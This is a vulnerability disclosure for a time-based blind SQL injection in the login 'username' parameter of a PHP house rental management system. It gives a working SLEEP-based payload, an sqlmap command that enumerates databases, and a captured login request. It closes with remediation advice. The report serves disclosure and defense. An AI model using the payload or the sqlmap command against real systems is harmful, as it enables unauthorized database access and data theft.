# SourceCodester Best house rental management system project in php 1.0 SQL Injection

## NAME OF AFFECTED PRODUCT

- est house rental management system project in php

### Vendor Homepage

- https://www.sourcecodester.com/php/17375/best-courier-management-system-project-php.html

## AFFECTED AND/OR FIXED VERSION

### submitter

- y3z1f4n

### Vulnerable File

- admin_class.php

### Version

- V1.0

### Software Link

- [Downloading Best house rental management system project in php Code | SourceCodester](https://www.sourcecodester.com/download-code?nid=17375&title=Best+house+rental+management+system+project+in+php+)

## PROBLEM TYPE

### Vulnerable Type

- SQL Injection

### Root Cause

- A SQL injection vulnerability was found in the "admin_class.php" file of the "Best house rental management system project in php" project. The cause of the issue is that an attacker injects malicious code from the parameter "username" and uses it directly for SQL queries to the database without verification. This allows an attacker to construct input values, thereby manipulating SQL queries and performing unauthorized operations.

![image-20240616173045573](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20240616173045573.png)

### Impact

- Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, full system control and even service interruption, posing a serious threat to system security and business continuity.

## DESCRIPTION

- Due to insufficient user input validation for the "username" parameter, a serious SQL injection vulnerability was found in the login function of "Best house rental management system project in php", allowing attackers to inject malicious SQL queries. As a result, an attacker can gain unauthorized access to the database without logging in, modify or delete data and access sensitive information. Immediate remediation is required to ensure system security and protect data integrity.

## Vulnerability details and POC

### Vulnerability type

- time-based blind

### Vulnerability location

- 'username' parameter in "admin_class.php"

### Payload

- username=admin' AND (SELECT 5426 FROM (SELECT(SLEEP(5)))ABPy) AND 'wtFY'='wtFY&password=pass

We can see that the page response time is 5s，there is time-based blind.

![image-20240616174420199](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20240616174420199.png)

The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:

```bash
sqlmap -r source.txt -p username,password --dbs --batch
```

The content of source.txt:

```bash
POST /rental/ajax.php?action=login HTTP/1.1
Host: 192.168.20.156
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 28
Origin: http://192.168.20.156
Connection: close
Referer: http://192.168.20.156/rental/login.php
Cookie: PHPSESSID=ovnjt8tf7so1vsv86582r6ee7v
Priority: u=1

username=admin&password=pass
```

![image-20240616175247067](C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20240616175247067.png)



## Suggested repair

1. **Use prepared statements and parameter binding:**
   Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.
2. **Input validation and filtering:**
   Strictly validate and filter user input data to ensure it conforms to the expected format.
3. **Minimize database user permissions:**
   Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.
4. **Regular security audits:**
   Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.